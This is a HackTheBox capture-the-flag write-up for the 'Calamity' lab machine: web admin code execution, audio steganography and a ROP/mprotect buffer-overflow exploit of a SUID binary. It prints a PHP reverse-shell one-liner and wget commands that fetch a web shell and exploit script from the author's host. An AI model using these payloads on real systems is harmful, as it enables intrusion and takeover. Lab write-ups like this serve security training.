---
title: '[HackTheBox] "Calamity" machine writeup (Checkpoint style)'
date: 2020-08-21T01:27:10+03:00
tags: [writeup, binary-exploit, hackthebox]
---

## Legend:
- `[*]` – Info
- `[+]` – Progress
- `[-]` – No use / Dead end
- `[!]` – Important
- `[?]` – Maybe useful
- `==========` – Next stage

## Files:
https://github.com/limitedeternity/HackTheBox/tree/main/Machines/CALAMITY

## Checkpoints:
`[*]` **80/tcp**: Apache 2.4.18

`[*]` wfuzz:
- `/admin.php`
- `/uploads` (*has listing*)

`[+]` `$ curl http://10.10.10.27/admin.php` yields password.

`[+]` Logged in as admin.

`[+]` The most elite RCE there.
```
<?php sleep(10); ?>
```
`[*]` We'll use it to upload a shell to **/uploads**.
```
<?php system("wget http://10.10.14.12:8000/phpbash.php -O ./uploads/phpbash.php"); ?>
```
`[+]` Success. 

`[-]` Hm. Something kills foreign processes.

`[+]` Oh, PHP reverse TCP shell worked like a charm:
```
php -r '$sock=fsockopen("10.10.14.12",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
```
`[+]` Username: **xalvas**.

`[+]` Got **user.txt**.

`[*]` Extracted audio files.

`[*]` (exiftool) recov.wav has the following comment: "Isn't this were we came in?". Pink Floyd, eh?

`[-]` [LSB extraction](https://gist.github.com/reachsumit/583c76ffd740e1a952d65da3c676931f#file-audio-steganography-receiver-py) didn't work.

`[-]` Nothing in binwalk.

`[+]` rick.wav and recov.wav sounded like the same track, so I decided to [subtract one audio track from another](https://forum.audacityteam.org/viewtopic.php?t=74683).
Then I did "Tracks > Mix > Mix And Render To New Track" and removed other tracks.
As a result, I got a track (subtracted.wav), where the password is pronounced, but the speech is split in two and the parts are swapped.
Concatenated these two parts in correct order, cut off silence, exported (password.wav).

`[+]` SSH'd as **xalvas**.

`[+]` Found SUID binary "app/goodluck" and its partial source code "app/src.c".

`[+]` ASLR is disabled on machine (what a luck).

`[+]` NX: true. ROP-ROP.

`==============================`

```
gdb-peda$ break main
Breakpoint 1 at 0x80000d86

gdb-peda$ run
<...>

gdb-peda$ pattern_create 200 fuzz
Writing pattern of 200 chars to filename "fuzz"

gdb-peda$ jump debug

<...>
vulnerable pointer is at bffff600 <--- [!] Points to the buffer. We'll jump there to execute our shellcode (0xbffff600).
<...>
0xbfedf000 0xc0000000 rw-p	[stack] <--- [!] Stack area range

Filename:  fuzz

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41413341 ('A3AA')
ECX: 0xb7fccbcc --> 0x21000 
EDX: 0x0 
ESI: 0xb7fcc000 --> 0x1b1db0 
EDI: 0xb7fcc000 --> 0x1b1db0 
EBP: 0x65414149 ('IAAe')
ESP: 0xbffff620 ("AJAAfAA5AAKAAgAA6AAL\211\343\a\001")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)

<...>

gdb-peda$ pattern offset 'AA4A'
AA4A found at offset: 76
```

`[!]` Size of area to overwrite is **76**.
```
gdb-peda$ p mprotect
$2 = {<text variable, no debug info>} 0xb7efcd50 <mprotect>
```
`[!]` `mprotect` is at **0xb7efcd50**.

`[*]` `mprotect` man page:
```
int mprotect(void *addr, size_t len, int prot);
DESCRIPTION
       mprotect() changes protection for the calling process's memory page(s) containing any part of the address range in the interval [addr, addr+len-1].

#define PROT_READ       0x01            /* page can be read */
#define PROT_WRITE      0x02            /* page can be written */
#define PROT_EXEC       0x04            /* page can be executed */
```
`[!]` We'll pass the stack start address as a first argument to make it executable (and get rid of NX protection).

`[!]` The second argument will be stack's length:
``` 
gdb-peda$ p/x 0xc0000000 - 0xbfedf000
$3 = 0x121000
```
`[!]` The third argument, obviously, will be (`PROT_EXEC` (0x4) | `PROT_READ` (0x1) | `PROT_WRITE` (0x2)), which is **0x7**.

`[*]` Next, we'll need a ROP gadget that is "pop-pop-pop-ret" to pop 3 arguments, that we pass to `mprotect`, and then return back. GDB-Peda has a built-in function for ROP gadget search:
```
gdb-peda$ ropgadget libc
ret = 0xb7e1a417
addesp_4 = 0xb7e455ea
popret = 0xb7e1baa6
pop3ret = 0xb7e317d9
pop4ret = 0xb7e319a4
pop2ret = 0xb7e317da
<...>
```
`[!]` pop3ret is at **0xb7e317d9**.

`[!]` We'll need a shellcode to execute: http://shell-storm.org/shellcode/files/shellcode-251.php

`[+]` Exploit is ready! (exploit.py)

```
gdb-peda$ run
Starting program: /home/xalvas/app/goodluck
<...>
Breakpoint 1, 0x80000d86 in main ()

gdb-peda$ jump debug
Continuing at 0x80000c15.

this function is problematic on purpose

I'm trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff600
memory information on this binary:
<...>


Filename:
```

`[!]` Stop right there. We need to write our payload to a file before passing it to the program:
```
xalvas@calamity:/tmp$ wget http://10.10.14.12:8000/exploit.py 
<...>
2020-08-19 10:26:02 (71.1 MB/s) - 'exploit.py' saved [664/664]

xalvas@calamity:/tmp$ python exploit.py
```

`[*]` Now, we are ready:

```
Filename: /tmp/fuzz

process 24287 is executing new program: /bin/dash

<...>

$ id
`[New process 24491]`
process 24491 is executing new program: /usr/bin/id
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

`[*]` But we are still isolated as **xalvas**, because we need to perform it without a debugger (debugger doesn't have a SUID bit set).

`[*]` PS: I see, that I can abuse lxd group, but that's not an intended way of solving this box.

`[*]` Let's say the exploit we've written just now is a **stage2**. And we need a **stage1** one. Restart GDB.

`====================`

```
gdb-peda$ pattern_create 30 fuzz
Writing pattern of 30 chars to filename "fuzz"

gdb-peda$ run
Starting program: /home/xalvas/app/goodluck 

Filename:  /tmp/fuzz

	-----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 3

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x414142a9 
EBX: 0x41414241 ('ABAA')
ECX: 0xa ('\n')
EDX: 0xb7fcd87c --> 0x0 
ESI: 0xb7fcc000 --> 0x1b1db0 
EDI: 0xb7fcc000 --> 0x1b1db0 
EBP: 0xbffff648 --> 0x0 
ESP: 0xbffff620 --> 0x1 
EIP: 0x80000e6e (<main+247>:	mov    edx,DWORD PTR [eax+0xc])
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
<...>

gdb-peda$ pattern_search "ABAA"
Registers contain pattern buffer:
EBX+0 found at offset: 8
EAX+-104 found at offset: 8
Pattern buffer found at:
0x80003068 : offset    0 - size    5 (/home/xalvas/app/goodluck)
0x80004978 : offset    0 - size   30 ([heap])
Reference to pattern buffer not found in memory
```

`[!]` We took control of EBX register. Also, buffer size is **8** bytes. Let's check what's at **0x80003068**:
```
gdb-peda$ x/64xb 0x80003068
0x80003068 <hey>:	0x41	0x41	0x41	0x25	0x41	0x00	0x00	0x00
0x80003070 <hey+8>:	0x00	0x00	0x00	0x00	0xad	0x21	0x0f	0x01
0x80003078 <hey+16>:	0x00	0x00	0x00	0x00	0x76	0x99	0x30	0x1f
0x80003080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x80003088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x80003090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x80003098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x800030a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```
`[!]` **0x80003068** is a start of "hey" struct.
```
gdb-peda$ disass main
   <...>
   0x80000e68 <+241>:	lea    eax,[ebx+0x68]
   0x80000e6e <+247>:	mov    edx,DWORD PTR [eax+0xc]
   0x80000e71 <+250>:	lea    eax,[ebx+0x68]
   0x80000e77 <+256>:	mov    eax,DWORD PTR [eax+0x10]
   0x80000e7a <+259>:	sub    esp,0x4
   0x80000e7d <+262>:	push   edx                         # [*] hey.secret
   0x80000e7e <+263>:	push   DWORD PTR [ebp-0x14]        # [*] protect
   0x80000e81 <+266>:	push   eax                         # [*] hey.admin
   0x80000e82 <+267>:	call   0x80000cc0 <attempt_login>  # [*] attempt_login(hey.admin, protect, hey.secret)
   <...>

limitedeternity$ cat src.c
  <...>
  struct f {
    char user[USIZE];
    int secret;
    int admin;
    int session;
  } hey;

  <...>
  attempt_login(hey.admin, protect, hey.secret);
  <...>
```

`[!]` So:
- "char user[]" is located at **0x80003068** and is 8 bytes long (this is our buffer).
- "int secret" starts at **0x80003070** and is 4 bytes long (because it's int).
- "int admin" starts at **0x80003074** and is 4 bytes long (because it's int).
- "int session" starts at **0x80003078** and is 4 bytes long (because it's int).

`[!]` To make sure we pass through `attempt_login` function, we need:
- To ensure that "hey.secret" == "protect".
- Make "hey.admin" != 0.

`[!]` Knowing that EAX is "hey.admin" and EDX is "hey.secret", let's make pointer equations from assembly code above.
```
1) eax = ebx + 0x68
2) edx = eax + 0xc
---------------
edx = ebx + 0x68 + 0xc
---------------
edx = ebx + 0x74
```

`[*]` If we can make EDX point to somewhere else in the memory, where value is the same as that of "protect/hey.secret" variable, then we can make EAX ("hey.admin") non-zero without fearing to overwrite something important.

`[*]` Let's assume we know the value of "protect" variable. We will store that value in the file and pass it to createusername() function so that it gets stored at the location of "hey.user" (**0x80003068**). If we make EDX to point to "hey.user", then we will able to satisfy "hey.secret" == "protect" condition. 

`[!]` So:
```
edx = 0x80003068
-----------------
0x80003068 = ebx + 0x74
-----------------
ebx = 0x80003068 - 0x74 = 0x80002ff4
```

`[!]` The **stage1** payload will be: "protect/hey.secret" value (4 bytes) + "\x41" * 4 + EBX (4 bytes). 8 bytes to fill buffer, 4 bytes to put into EBX.

`[*]` This way we can pass through `attempt_login` function and call `debug`. But we still need to know the value of "protect" variable. We'll need a **stage0** payload for that.
```
gdb-peda$ disass main
Dump of assembler code for function main:
   <...>
   0x80000e4b <+212>:	lea    eax,[ebx+0x68]
   0x80000e51 <+218>:	mov    eax,DWORD PTR [eax+0x14]
   0x80000e54 <+221>:	sub    esp,0xc
   0x80000e57 <+224>:	push   eax
   0x80000e58 <+225>:	call   0x80000be3 <printdeb>
   <...>
```
`[!]` As we can see, `printdeb` function prints contents of EAX. And we know, that EAX depends on EBX. Also, we know that at this moment "hey.secret" == "protect". It's time to make some pointer equations:
```
eax = 0x80003070
----------------
1) eax = ebx + 0x68
2) eax = eax + 0x14
----------------
0x80003070 = ebx + 0x64 + 0x14
----------------
ebx = 0x80003070 - 0x64 - 0x14 = 0x80002ff8
```

`[!]` The **stage0** payload will be: "\x41" * 8 + EBX (4 bytes). 8 bytes to fill buffer, 4 bytes to put into EBX.

`[+]` Compounding an exploit and proceeding.

`[+]` Got root.txt!
